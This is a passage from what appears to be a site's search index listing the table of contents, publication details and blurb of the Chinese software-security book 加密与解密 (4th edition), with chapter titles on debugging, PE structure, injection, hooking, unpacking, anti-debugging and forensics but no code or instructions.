\u8d44\u6e90\u7ed3\u6784\u5b9e\u4f8b\u5206\u6790 438 11.9.3 \u8d44\u6e90\u7f16\u8f91\u5de5\u5177 440 11.10 TLS\u521d\u59cb\u5316 440 11.11 \u8c03\u8bd5\u76ee\u5f55 441 11.12 \u5ef6\u8fdf\u8f7d\u5165\u6570\u636e 441 11.13 \u7a0b\u5e8f\u5f02\u5e38\u6570\u636e 442 11.14 .NET\u5934\u90e8 442 11.15 \u7f16\u5199PE\u5206\u6790\u5de5\u5177 443 11.15.1 \u68c0\u67e5\u6587\u4ef6\u683c\u5f0f 443 11.15.2 \u8bfb\u53d6FileHeader\u548cOptionalHeader\u7684\u5185\u5bb9 444 11.15.3 \u5f97\u5230\u6570\u636e\u76ee\u5f55\u8868\u4fe1\u606f 445 11.15.4 \u5f97\u5230\u533a\u5757\u8868\u4fe1\u606f 446 11.15.5 \u5f97\u5230\u8f93\u51fa\u8868\u4fe1\u606f 447 11.15.6 \u5f97\u5230\u8f93\u5165\u8868\u4fe1\u606f 448 \u7b2c12\u7ae0 \u6ce8\u5165\u6280\u672f 450 12.1 DLL\u6ce8\u5165\u65b9\u6cd5 450 12.1.1 \u901a\u8fc7\u5e72\u9884\u8f93\u5165\u8868\u5904\u7406\u8fc7\u7a0b\u52a0\u8f7d\u76ee\u6807DLL 450 12.1.2 \u6539\u53d8\u7a0b\u5e8f\u8fd0\u884c\u6d41\u7a0b\u4f7f\u5176\u4e3b\u52a8\u52a0\u8f7d\u76ee\u6807DLL 466 12.1.3 \u5229\u7528\u7cfb\u7edf\u673a\u5236\u52a0\u8f7dDLL 484 12.2 DLL\u6ce8\u5165\u7684\u5e94\u7528 491 12.3 DLL\u6ce8\u5165\u7684\u9632\u8303 491 12.3.1 \u9a71\u52a8\u5c42\u9632\u8303 491 12.3.2 \u5e94\u7528\u5c42\u9632\u8303 493 \u7b2c13\u7ae0 Hook\u6280\u672f 497 13.1 Hook\u6982\u8ff0 497 13.1.1 IAT Hook\u7be1\u6539MessageBox\u6d88\u606f 497 13.1.2 Inline Hook\u7be1\u6539\u6307\u5b9aMessageBox\u6d88\u606f 499 13.2 Hook\u7684\u5206\u7c7b 500 13.2.1 Address Hook 501 13.2.2 Inline Hook 511 13.2.3 \u57fa\u4e8e\u5f02\u5e38\u5904\u7406\u7684Hook 513 13.2.4 \u4e0d\u662fHook\u7684Hook 514 13.3 Hook\u4f4d\u7f6e\u7684\u6311\u9009 515 13.4 Hook\u7684\u5178\u578b\u8fc7\u7a0b 519 13.4.1 Address Hook\u7684\u5b9e\u65bd\u8fc7\u7a0b 519 13.4.2 Inline Hook\u7684\u5b9e\u65bd\u8fc7\u7a0b 526 13.4.3 \u57fa\u4e8e\u5f02\u5e38\u5904\u7406\u7684Hook\u5b9e\u65bd\u8fc7\u7a0b 529 13.4.4 \u4e8c\u6b21Hook\u7684\u6ce8\u610f\u4e8b\u9879 532 13.4.5 \u901a\u7528Hook\u5f15\u64ce\u7684\u5b9e\u73b0 533 13.5 Detour\u51fd\u6570\u7684\u5178\u578b\u7528\u6cd5 533 13.6 Hook\u4e2d\u7684\u6ce8\u610f\u4e8b\u9879 536 13.7 Hook\u5728x64\u5e73\u53f0\u4e0a\u7684\u65b0\u95ee\u9898 541 13.8 Hook\u6280\u672f\u7684\u5e94\u7528 543 13.9 Hook\u7684\u68c0\u6d4b\u3001\u6062\u590d\u4e0e\u5bf9\u6297 544 13.9.1 Hook\u7684\u68c0\u6d4b\u4e0e\u6062\u590d 544 13.9.2 Hook\u7684\u5bf9\u6297 545 13.10 \u672c\u7ae0\u5c0f\u7ed3 546 \u6f0f\u6d1e\u7bc7 \u7b2c14\u7ae0 \u6f0f\u6d1e\u5206\u6790\u6280\u672f 548 14.1 \u8f6f\u4ef6\u6f0f\u6d1e\u539f\u7406 548 14.1.1 \u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e 548 14.1.2 \u6574\u578b\u6ea2\u51fa\u6f0f\u6d1e 553 14.1.3 UAF\u6f0f\u6d1e 555 14.2 Shellcode 555 14.2.1 Shellcode\u7684\u7ed3\u6784 556 14.2.2 Shellcode\u901a\u7528\u6280\u672f 559 14.2.3 \u5b9e\u6218Shellcode\u7f16\u5199 560 14.3 \u6f0f\u6d1e\u5229\u7528 566 14.3.1 \u6f0f\u6d1e\u5229\u7528\u57fa\u672c\u6280\u672f 567 14.3.2 \u6f0f\u6d1e\u5229\u7528\u9ad8\u7ea7\u6280\u672f 570 14.4 \u6f0f\u6d1e\u6837\u672c 572 14.5 \u6837\u672c\u5206\u6790 573 14.5.1 \u51c6\u5907\u5de5\u4f5c 573 14.5.2 \u9759\u6001\u5206\u6790 574 14.5.3 \u52a8\u6001\u8c03\u8bd5 576 14.5.4 \u8ffd\u6839\u6eaf\u6e90 581 14.5.5 \u5c0f\u7ed3 585 \u8131\u58f3\u7bc7 \u7b2c15\u7ae0 \u4e13\u7528\u52a0\u5bc6\u8f6f\u4ef6 588 15.1 \u8ba4\u8bc6\u58f3 588 15.1.1 \u58f3\u7684\u6982\u5ff5 588 15.1.2 \u538b\u7f29\u5f15\u64ce 589 15.2 \u538b\u7f29\u58f3 589 15.2.1 UPX 589 15.2.2 ASPack 590 15.3 \u52a0\u5bc6\u58f3 590 15.3.1 ASProtect 590 15.3.2 Armadillo 590 15.3.3 EXECryptor 591 15.3.4 Themida 591 15.4 \u865a\u62df\u673a\u4fdd\u62a4\u8f6f\u4ef6 592 15.4.1 \u865a\u62df\u673a\u4ecb\u7ecd 592 15.4.2 VMProtect\u7b80\u4ecb 592 \u7b2c16\u7ae0 \u8131\u58f3\u6280\u672f 594 16.1 \u57fa\u7840\u77e5\u8bc6 594 16.1.1 \u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b 594 16.1.2 \u8131\u58f3\u673a 595 16.1.3 \u624b\u52a8\u8131\u58f3 596 16.2 \u5bfb\u627eOEP 596 16.2.1 \u6839\u636e\u8de8\u6bb5\u6307\u4ee4\u5bfb\u627eOEP 596 16.2.2 \u7528\u5185\u5b58\u8bbf\u95ee\u65ad\u70b9\u5bfb\u627eOEP 600 16.2.3 \u6839\u636e\u6808\u5e73\u8861\u539f\u7406\u5bfb\u627eOEP 601 16.2.4 \u6839\u636e\u7f16\u8bd1\u8bed\u8a00\u7279\u70b9\u5bfb\u627eOEP 602 16.3 \u6293\u53d6\u5185\u5b58\u6620\u50cf 603 16.3.1 Dump\u539f\u7406 603 16.3.2 \u53cdDump\u6280\u672f 604 16.4 \u91cd\u5efa\u8f93\u5165\u8868 606 16.4.1 \u8f93\u5165\u8868\u91cd\u5efa\u7684\u539f\u7406 606 16.4.2 \u786e\u5b9aIAT\u7684\u5730\u5740\u548c\u5927\u5c0f 607 16.4.3 \u6839\u636eIAT\u91cd\u5efa\u8f93\u5165\u8868 608 16.4.4 \u7528Import REC\u91cd\u5efa\u8f93\u5165\u8868 611 16.4.5 \u8f93\u5165\u8868\u52a0\u5bc6\u6982\u62ec 614 16.5 DLL\u6587\u4ef6\u8131\u58f3 615 16.5.1 \u5bfb\u627eOEP 615 16.5.2 Dump\u6620\u50cf\u6587\u4ef6 617 16.5.3 \u91cd\u5efaDLL\u7684\u8f93\u5165\u8868 618 16.5.4 \u6784\u9020\u91cd\u5b9a\u4f4d\u8868 619 16.6 \u9644\u52a0\u6570\u636e 621 16.7 PE\u6587\u4ef6\u7684\u4f18\u5316 623 16.8 \u538b\u7f29\u58f3 626 16.8.1 UPX\u5916\u58f3 626 16.8.2 ASPack\u5916\u58f3 629 16.9 \u52a0\u5bc6\u58f3 633 16.10 \u9759\u6001\u8131\u58f3 637 16.10.1 \u5916\u58f3Loader\u5206\u6790 637 16.10.2 \u7f16\u5199\u9759\u6001\u8131\u58f3\u5668 641 \u4fdd\u62a4\u7bc7 \u7b2c17\u7ae0 \u8f6f\u4ef6\u4fdd\u62a4\u6280\u672f 644 17.1 \u9632\u8303\u7b97\u6cd5\u6c42\u9006 644 17.1.1 \u57fa\u672c\u6982\u5ff5 644 17.1.2 \u5821\u5792\u6218\u672f 645 17.1.3 \u6e38\u51fb\u6218\u672f 646 17.2 \u62b5\u5fa1\u9759\u6001\u5206\u6790 647 17.2.1 \u82b1\u6307\u4ee4 647 17.2.2 SMC\u6280\u672f\u5b9e\u73b0 649 17.2.3 \u4fe1\u606f\u9690\u85cf 653 17.2.4 \u7b80\u5355\u7684\u591a\u6001\u53d8\u5f62\u6280\u672f 654 17.3 \u6587\u4ef6\u5b8c\u6574\u6027\u68c0\u9a8c 655 17.3.1 \u78c1\u76d8\u6587\u4ef6\u6821\u9a8c\u7684\u5b9e\u73b0 655 17.3.2 \u6821\u9a8c\u548c 657 17.3.3 \u5185\u5b58\u6620\u50cf\u6821\u9a8c 657 17.4 \u4ee3\u7801\u4e0e\u6570\u636e\u7ed3\u5408 659 17.4.1 \u51c6\u5907\u5de5\u4f5c 660 17.4.2 \u52a0\u5bc6\u7b97\u6cd5\u7684\u9009\u7528 661 17.4.3 \u624b\u52a8\u52a0\u5bc6\u4ee3\u7801 661 17.4.4 \u4f7f .text\u533a\u5757\u53ef\u5199 662 17.5 \u5173\u4e8e\u8f6f\u4ef6\u4fdd\u62a4\u7684\u82e5\u5e72\u5fe0\u544a 663 \u7b2c18\u7ae0 \u53cd\u8ddf\u8e2a\u6280\u672f 665 18.1 \u7531BeingDebugged\u5f15\u53d1\u7684\u8774\u8776\u6548\u5e94 665 18.1.1 BeingDebugged 665 18.1.2 NtGlobalFlag 669 18.1.3 Heap Magic 671 18.1.4 \u4ece\u6e90\u5934\u6d88\u706dBeingDebugged 676 18.2 \u56de\u5f52Native\uff1a\u7528\u6237\u6001\u7684\u68a6\u9b47 676 18.2.1 CheckRemoteDebuggerPresent 677 18.2.2 ProcessDebugPort 677 18.2.3 ThreadHideFromDebugger 680 18.2.4 DebugObject 682 18.2.5 SystemKernelDebuggerInformation 686 18.2.6 Native API 688 18.2.7 Hook\u548cAntiHook 693 18.3 \u771f\u6b63\u7684\u5965\u79d8\uff1a\u5c0f\u6280\u5de7\u4e00\u89c8 696 18.3.1 SoftICE\u68c0\u6d4b\u65b9\u6cd5 696 18.3.2 OllyDbg\u68c0\u6d4b\u65b9\u6cd5 698 18.3.3 \u8c03\u8bd5\u5668\u6f0f\u6d1e 700 18.3.4 \u9632\u6b62\u8c03\u8bd5\u5668\u9644\u52a0 701 18.3.5 \u7236\u8fdb\u7a0b\u68c0\u6d4b 703 18.3.6 \u65f6\u95f4\u5dee 703 18.3.7 \u901a\u8fc7Trap Flag\u68c0\u6d4b 704 18.3.8 \u53cc\u8fdb\u7a0b\u4fdd\u62a4 704 \u7b2c19\u7ae0 \u5916\u58f3\u7f16\u5199\u57fa\u7840 705 19.1 \u5916\u58f3\u7684\u7ed3\u6784 705 19.2 \u52a0\u58f3\u4e3b\u7a0b\u5e8f 706 19.2.1 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3aPE\u683c\u5f0f 706 19.2.2 \u6587\u4ef6\u57fa\u672c\u6570\u636e\u8bfb\u5165 706 19.2.3 \u9644\u52a0\u6570\u636e\u7684\u8bfb\u53d6 708 19.2.4 \u8f93\u5165\u8868\u7684\u5904\u7406 708 19.2.5 \u91cd\u5b9a\u4f4d\u8868\u7684\u5904\u7406 711 19.2.6 \u6587\u4ef6\u7684\u538b\u7f29 713 19.2.7 \u8d44\u6e90\u6570\u636e\u7684\u5904\u7406 716 19.2.8 \u533a\u5757\u7684\u878d\u5408 720 19.3 \u7528\u6c47\u7f16\u5199\u5916\u58f3\u90e8\u5206 721 19.3.1 \u5916\u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b 721 19.3.2 \u81ea\u5efa\u8f93\u5165\u8868 722 19.3.3 \u5916\u58f3\u5f15\u5bfc\u6bb5 723 19.3.4 \u5916\u58f3\u7b2c2\u90e8\u5206 726 19.3.5 \u5c06\u5916\u58f3\u90e8\u5206\u6dfb\u52a0\u81f3\u539f\u7a0b\u5e8f 731 19.4 \u7528C++\u7f16\u5199\u5916\u58f3\u90e8\u5206 734 \u7b2c20\u7ae0 \u865a\u62df\u673a\u7684\u8bbe\u8ba1 739 20.1 \u865a\u62df\u673a\u4fdd\u62a4\u6280\u672f\u539f\u7406 739 20.1.1 \u53cd\u6c47\u7f16\u5f15\u64ce 739 20.1.2 \u6307\u4ee4\u5206\u7c7b 739 20.2 \u542f\u52a8\u6846\u67b6\u548c\u8c03\u7528\u7ea6\u5b9a 740 20.2.1 \u8c03\u5ea6\u5668 740 20.2.2 \u865a\u62df\u73af\u5883 741 20.2.3 \u5e73\u8861\u6808vBegin\u548cvCheckESP 742 20.3 Handler\u7684\u8bbe\u8ba1 743 20.3.1 \u8f85\u52a9Handler 743 20.3.2 \u666e\u901aHandler\u548c\u6307\u4ee4\u62c6\u89e3 744 20.3.3 \u6807\u5fd7\u4f4d\u95ee\u9898 745 20.3.4 \u76f8\u540c\u4f5c\u7528\u7684\u6307\u4ee4 745 20.3.5 \u8f6c\u79fb\u6307\u4ee4 746 20.3.6 \u8f6c\u79fb\u8df3\u8f6c\u6307\u4ee4\u7684\u53e6\u4e00\u79cd\u5b9e\u73b0 747 20.3.7 call\u6307\u4ee4 748 20.3.8 retn\u6307\u4ee4 748 20.3.9 \u4e0d\u53ef\u6a21\u62df\u6307\u4ee4 749 20.4 \u6258\u7ba1\u4ee3\u7801\u7684\u5f02\u5e38\u5904\u7406 749 20.4.1 VC++\u7684\u5f02\u5e38\u5904\u7406 749 20.4.2 Delphi\u7684\u5f02\u5e38\u5904\u7406 754 20.5 \u672c\u7ae0\u5c0f\u7ed3 757 \u7b2c21\u7ae0 VMProtect\u9006\u5411\u548c\u8fd8\u539f\u6d45\u6790 758 21.1 VMProtect\u9006\u5411\u5206\u6790 758 21.1.1 VMProtect\u865a\u62df\u6267\u884c\u5f15\u64ce\u7684\u5168\u666f\u56fe 758 21.1.2 VMProtect\u865a\u62df\u5f15\u64ce\u7684\u57fa\u672c\u67b6\u6784 763 21.1.3 \u6307\u4ee4\u5206\u7c7b 763 21.2 VMProtect\u7684\u8fd8\u539f 765 21.2.1 \u865a\u62df\u6267\u884c\u7cfb\u7edf 766 21.2.2 \u751f\u6210\u5b8c\u6574\u7684\u5b57\u8282\u7801\u6d41\u7a0b\u56fe 767 21.2.3 \u7ed9Handler\u547d\u540d\u5e76\u6dfb\u52a0\u8bed\u4e49\u52a8\u4f5c 774 21.2.4 \u5c06\u5b57\u8282\u7801\u7684\u4f4e\u7ea7\u63cf\u8ff0\u8f6c\u6362\u4e3a\u4e2d\u7ea7\u63cf\u8ff0 775 21.2.5 \u6e05\u9664\u65e0\u7528\u7684\u5b57\u8282\u7801 776 21.2.6 \u7528\u771f\u503c\u8868\u5316\u7b80\u903b\u8f91\u6307\u4ee4 776 21.2.7 \u4ece\u7279\u5f81\u4e2d\u5efa\u7acb\u90e8\u5206\u5bc4\u5b58\u5668\u6620\u5c04\u4fe1\u606f 779 21.2.8 \u5176\u4ed6\u65e0\u6cd5\u786e\u5b9a\u7684\u5bc4\u5b58\u5668\u7684\u56fe\u7740\u8272\u7b97\u6cd5 785 21.2.9 \u4f7f\u7528DAG\u5339\u914d\u751f\u6210\u6307\u4ee4 788 21.2.10 \u5176\u4ed6\u95ee\u9898 791 \u8f6f\u4ef6\u91cd\u6784\u7bc7 \u7b2c22\u7ae0 \u8865\u4e01\u6280\u672f 794 22.1 \u6587\u4ef6\u8865\u4e01 794 22.2 \u5185\u5b58\u8865\u4e01 795 22.2.1 \u8de8\u8fdb\u7a0b\u5185\u5b58\u5b58\u53d6\u673a\u5236 795 22.2.2 Debug API\u673a\u5236 797 22.2.3 \u5229\u7528\u8c03\u8bd5\u5bc4\u5b58\u5668\u673a\u5236 800 22.2.4 \u5229\u7528DLL\u6ce8\u5165\u6280\u672f 803 22.2.5 \u5229\u7528Hook\u6280\u672f 807 22.2.6 \u5229\u7528VT\u6280\u672f 810 22.3 SMC\u8865\u4e01\u6280\u672f 813 22.3.1 \u5355\u5c42SMC\u8865\u4e01\u6280\u672f 813 22.3.2 \u591a\u5c42SMC\u8865\u4e01\u6280\u672f 814 22.4 \u8865\u4e01\u5de5\u5177 816 \u7b2c23\u7ae0 \u4ee3\u7801\u7684\u4e8c\u6b21\u5f00\u53d1 818 23.1 \u6570\u636e\u5bf9\u9f50 818 23.2 \u589e\u52a0\u7a7a\u95f4 818 23.2.1 \u533a\u5757\u95f4\u9699 818 23.2.2 \u624b\u52a8\u6784\u9020\u533a\u5757 819 23.2.3 \u5de5\u5177\u8f85\u52a9\u6784\u9020\u533a\u5757 820 23.3 \u83b7\u5f97\u51fd\u6570\u7684\u8c03\u7528\u4fe1\u606f 820 23.3.1 \u589e\u52a0\u8f93\u5165\u51fd\u6570 820 23.3.2 \u663e\u5f0f\u94fe\u63a5\u8c03\u7528DLL 821 23.4 \u4ee3\u7801\u7684\u91cd\u5b9a\u4f4d 822 23.4.1 \u4fee\u590d\u91cd\u5b9a\u4f4d\u8868 822 23.4.2 \u4ee3\u7801\u7684\u81ea\u5b9a\u4f4d\u6280\u672f 824 23.5 \u589e\u52a0\u8f93\u51fa\u51fd\u6570 825 23.6 \u6d88\u606f\u5faa\u73af 826 23.6.1 WndProc\u51fd\u6570 826 23.6.2 \u5bfb\u627e\u6d88\u606f\u5faa\u73af 827 23.6.3 WndProc\u6c47\u7f16\u5f62\u5f0f 828 23.7 \u83dc\u5355\u6269\u5c55 829 23.7.1 \u6269\u5145WndProc 829 23.7.2 \u6269\u5145Exit\u83dc\u5355\u7684\u529f\u80fd 830 23.7.3 \u6269\u5145Open\u83dc\u5355\u7684\u529f\u80fd 830 23.8 DLL\u6269\u5c55 833 23.8.1 \u6269\u5c55\u63a5\u53e3 833 23.8.2 \u6269\u5c55\u6d88\u606f\u5faa\u73af 834 \u8bed\u8a00\u548c\u5e73\u53f0\u7bc7 \u7b2c24\u7ae0 .NET\u5e73\u53f0\u52a0\u89e3\u5bc6 838 24.1 .NET\u6982\u8ff0 838 24.1.1 \u4ec0\u4e48\u662f .NET 838 24.1.2 \u57fa\u672c\u6982\u5ff5 839 24.1.3 \u7b2c1\u4e2a .NET\u7a0b\u5e8f 840 24.2 MSIL\u4e0e\u5143\u6570\u636e 841 24.2.1 PE\u7ed3\u6784\u7684\u6269\u5c55 841 24.2.2 .NET\u4e0b\u7684\u6c47\u7f16MSIL 847 24.2.3 MSIL\u4e0e\u5143\u6570\u636e\u7684\u7ed3\u5408 849 24.3 \u4ee3\u7801\u5206\u6790\u4e0e\u4fee\u6539\u6280\u672f 851 24.3.1 \u9759\u6001\u5206\u6790 851 24.3.2 \u52a8\u6001\u8c03\u8bd5 853 24.3.3 \u4ee3\u7801\u4fee\u6539 855 24.4 .NET\u4ee3\u7801\u4fdd\u62a4\u6280\u672f\u53ca\u5176\u9006\u5411 857 24.4.1 \u5f3a\u540d\u79f0 857 24.4.2 \u540d\u79f0\u6df7\u6dc6 859 24.4.3 \u6d41\u7a0b\u6df7\u6dc6 863 24.4.4 \u538b\u7f29 865 24.4.5 \u52a0\u5bc6 869 24.4.6 \u5176\u4ed6\u4fdd\u62a4\u624b\u6bb5 875 24.5 \u672c\u7ae0\u5c0f\u7ed3 876 \u53d6\u8bc1\u7bc7 \u7b2c25\u7ae0 \u6570\u636e\u53d6\u8bc1\u6280\u672f 878 25.1 \u786c\u76d8\u6570\u636e\u7684\u83b7\u53d6\u548c\u56fa\u5b9a 878 25.1.1 \u786c\u76d8\u6570\u636e\u7684\u83b7\u53d6 878 25.1.2 \u7535\u5b50\u6570\u636e\u7684\u56fa\u5b9a 882 25.2 \u786c\u76d8\u7684\u5206\u533a\u548c\u6570\u636e\u6062\u590d 882 25.2.1 \u5206\u533a\u7684\u89e3\u6790 884 25.2.2 \u57fa\u4e8e\u6587\u4ef6\u7cfb\u7edf\u7684\u6570\u636e\u6062\u590d\u539f\u7406 886 25.3 \u5185\u5b58\u5206\u6790 890 25.3.1 \u5185\u5b58\u955c\u50cf\u7684\u83b7\u53d6 891 25.3.2 \u5185\u5b58\u955c\u50cf\u7684\u5206\u6790 894 25.4 \u52a8\u6001\u4eff\u771f\u6280\u672f 897 25.4.1 \u4eff\u771f\u4e13\u7528\u786c\u4ef6 897 25.4.2 \u8f6f\u4ef6\u4eff\u771f 898 25.5 \u6ce8\u518c\u8868 900 25.5.1 Hive\u6587\u4ef6 900 25.5.2 \u6ce8\u518c\u8868\u4e2d\u7684\u65f6\u95f4 901 25.5.3 USB\u79fb\u52a8\u5b58\u50a8\u8bbe\u5907 902 25.6 \u6587\u4ef6\u683c\u5f0f 903 25.6.1 \u6587\u4ef6\u4fee\u590d\u548c\u7279\u5f81\u7801 903 25.6.2 \u57fa\u4e8e\u6587\u4ef6\u7684\u6570\u636e\u6062\u590d\u6280\u672f 904 25.6.3 \u6570\u636e\u9690\u85cf\u7684\u5206\u6790 906 \u672f\u8bed\u8868 909 \u53c2\u8003\u6587\u732e 911","title":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6"},{"location":"Book/PWN/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/#_1","text":"\u4f5c\u8005: \u6bb5\u94a2 \u51fa\u7248\u793e: \u7535\u5b50\u5de5\u4e1a\u51fa\u7248\u793e \u51fa\u54c1\u65b9: \u535a\u6587\u89c6\u70b9 \u51fa\u7248\u5e74: 2018-10-1 \u9875\u6570: 936 \u5b9a\u4ef7: 198 \u88c5\u5e27: \u5e73\u88c5 \u4e1b\u4e66: \u5b89\u5168\u6280\u672f\u5927\u7cfb ISBN: 9787121336928","title":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6"},{"location":"Book/PWN/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/#_2","text":"\u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\uff08\u7b2c4\u7248\uff09\u300b\u4ee5\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u4e3a\u5207\u5165\u70b9\uff0c\u8bb2\u8ff0\u4e86\u8f6f\u4ef6\u5b89\u5168\u9886\u57df\u7684\u57fa\u7840\u77e5\u8bc6\u548c\u6280\u80fd\uff0c\u5982\u8c03\u8bd5\u6280\u80fd\u3001\u9006\u5411\u5206\u6790\u3001\u52a0\u5bc6\u4fdd\u62a4\u3001\u5916\u58f3\u5f00\u53d1\u3001\u865a\u62df\u673a\u8bbe\u8ba1\u7b49\u3002\u8fd9\u4e9b\u77e5\u8bc6\u5f7c\u6b64\u8054\u7cfb\uff0c\u8bfb\u8005\u5728\u638c\u63e1\u8fd9\u4e9b\u5185\u5bb9\u4e4b\u540e\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u5728\u6f0f\u6d1e\u5206\u6790\u3001\u5b89\u5168\u7f16\u7a0b\u3001\u75c5\u6bd2\u5206\u6790\u3001\u8f6f\u4ef6\u4fdd\u62a4\u7b49\u9886\u57df\u8fdb\u884c\u6269\u5c55\u3002\u4ece\u5c31\u4e1a\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u638c\u63e1\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u7684\u76f8\u5173\u6280\u672f\uff0c\u53ef\u4ee5\u63d0\u9ad8\u81ea\u8eab\u7684\u7ade\u4e89\u80fd\u529b\uff1b\u4ece\u4e2a\u4eba\u6210\u957f\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u7814\u7a76\u8f6f\u4ef6\u5b89\u5168\u6280\u672f\u6709\u52a9\u4e8e\u638c\u63e1\u4e00\u4e9b\u7cfb\u7edf\u5e95\u5c42\u77e5\u8bc6\uff0c\u662f\u63d0\u5347\u804c\u4e1a\u6280\u80fd\u7684\u91cd\u8981\u9014\u5f84\u3002\u4f5c\u4e3a\u4e00\u540d\u5408\u683c\u7684\u7a0b\u5e8f\u5458\uff0c\u9664\u4e86\u638c\u63e1\u9700\u6c42\u5206\u6790\u3001\u8bbe\u8ba1\u6a21\u5f0f\u7b49\u5916\uff0c\u5982\u679c\u80fd\u638c\u63e1\u4e00\u4e9b\u7cfb\u7edf\u5e95\u5c42\u77e5\u8bc6\u3001\u719f\u6089\u6574\u4e2a\u7cfb\u7edf\u7684\u5e95\u5c42\u7ed3\u6784\uff0c\u5728\u5de5\u4f5c\u4e2d\u5fc5\u5c06\u83b7\u76ca\u826f\u591a\u3002 \u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\uff08\u7b2c4\u7248\uff09\u300b\u9002\u5408\u5b89\u5168\u7814\u7a76\u4eba\u5458\u3001\u8f6f\u4ef6\u8c03\u8bd5\u4eba\u5458\u3001\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u9605\u8bfb\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u9ad8\u6821\u4fe1\u606f\u5b89\u5168\u76f8\u5173\u4e13\u4e1a\u7684\u8f85\u52a9\u6559\u6750\u3002","title":"\u5185\u5bb9\u7b80\u4ecb"},{"location":"Book/PWN/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/#_3","text":"\u57fa\u7840\u7bc7 \u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6 2 1.1 \u4ec0\u4e48\u662f\u52a0\u5bc6\u4e0e\u89e3\u5bc6 2 1.1.1 \u8f6f\u4ef6\u7684\u52a0\u5bc6\u4e0e\u89e3\u5bc6 2 1.1.2 \u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b 2 1.1.3 \u9006\u5411\u5206\u6790\u6280\u672f 3 1.2 \u6587\u672c\u5b57\u7b26 4 1.2.1 ASCII\u4e0eUnicode\u5b57\u7b26\u96c6 4 1.2.2 \u5b57\u8282\u5b58\u50a8\u987a\u5e8f 6 1.3 Windows\u64cd\u4f5c\u7cfb\u7edf 6 1.3.1 Win32 API\u51fd\u6570 6 1.3.2 WOW64 9 1.3.3 Windows\u6d88\u606f\u673a\u5236 9 1.3.4 \u865a\u62df\u5185\u5b58 11 \u8c03\u8bd5\u7bc7 \u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f 14 2.1 OllyDbg\u8c03\u8bd5\u5668 14 2.1.1 OllyDbg\u7684\u754c\u9762 14 2.1.2 OllyDbg\u7684\u914d\u7f6e 15 2.1.3 \u57fa\u672c\u64cd\u4f5c 16 2.1.4 \u5e38\u7528\u65ad\u70b9 27 2.1.5 \u63d2\u4ef6 35 2.1.6 Run trace 36 2.1.7 Hit trace 37 2.1.8 \u8c03\u8bd5\u7b26\u53f7 37 2.1.9 \u52a0\u8f7d\u7a0b\u5e8f 39 2.1.10 OllyDbg\u7684\u5e38\u89c1\u95ee\u9898 40 2.2 x64dbg\u8c03\u8bd5\u5668 42 2.3 MDebug\u8c03\u8bd5\u5668 44 2.3.1 MDebug\u7684\u754c\u9762 44 2.3.2 \u8868\u8fbe\u5f0f 45 2.3.3 \u8c03\u8bd5 45 2.3.4 \u65ad\u70b9 46 2.3.5 MDebug\u7684\u5176\u4ed6\u529f\u80fd 47 2.4 WinDbg\u8c03\u8bd5\u5668 47 2.4.1 WinDbg\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e 47 2.4.2 \u8c03\u8bd5\u8fc7\u7a0b 51 2.4.3 \u65ad\u70b9\u547d\u4ee4 51 2.4.4 \u6808\u7a97\u53e3 53 2.4.5 \u5185\u5b58\u547d\u4ee4 55 2.4.6 \u811a\u672c 56 2.4.7 \u8c03\u8bd5\u529f\u80fd\u6269\u5c55 58 2.4.8 \u5c0f\u7ed3 59 \u7b2c3\u7ae0 \u9759\u6001\u5206\u6790\u6280\u672f 60 3.1 \u6587\u4ef6\u7c7b\u578b\u5206\u6790 60 3.2 \u53cd\u6c47\u7f16\u5f15\u64ce 61 3.2.1 OllyDbg\u7684ODDisasm 61 3.2.2 BeaEngine 61 3.2.3 Udis86 61 3.2.4 Capstone 62 3.2.5 AsmJit 63 3.2.6 Keystone 64 3.2.7 \u5c0f\u7ed3 64 3.3 \u9759\u6001\u53cd\u6c47\u7f16 65 3.3.1 IDA Pro\u7b80\u4ecb 65 3.3.2 IDA\u7684\u914d\u7f6e 66 3.3.3 IDA\u4e3b\u7a97\u53e3 68 3.3.4 \u4ea4\u53c9\u53c2\u8003 69 3.3.5 \u53c2\u8003\u91cd\u547d\u540d 70 3.3.6 \u6807\u7b7e\u7684\u7528\u6cd5 71 3.3.7 \u683c\u5f0f\u5316\u6307\u4ee4\u64cd\u4f5c\u6570 71 3.3.8 \u51fd\u6570\u7684\u64cd\u4f5c 72 3.3.9 \u4ee3\u7801\u548c\u6570\u636e\u8f6c\u6362 72 3.3.10 \u5b57\u7b26\u4e32 73 3.3.11 \u6570\u7ec4 74 3.3.12 \u7ed3\u6784\u4f53 75 3.3.13 \u679a\u4e3e\u7c7b\u578b 79 3.3.14 \u53d8\u91cf 80 3.3.15 FLIRT 81 3.3.16 IDC\u811a\u672c 82 3.3.17 \u63d2\u4ef6 86 3.3.18 IDA\u8c03\u8bd5\u5668 87 3.3.19 \u8fdc\u7a0b\u8c03\u8bd5 90 3.3.20 \u5176\u4ed6\u529f\u80fd 93 3.3.21 \u5c0f\u7ed3 94 3.4 \u5341\u516d\u8fdb\u5236\u5de5\u5177 94 3.5 \u9759\u6001\u5206\u6790\u6280\u672f\u5e94\u7528\u5b9e\u4f8b 97 3.5.1 \u89e3\u5bc6\u521d\u6b65 97 3.5.2 \u9006\u5411\u5de5\u7a0b\u521d\u6b65 99 \u89e3\u5bc6\u7bc7 \u7b2c4\u7ae0 \u9006\u5411\u5206\u6790\u6280\u672f 102 4.1 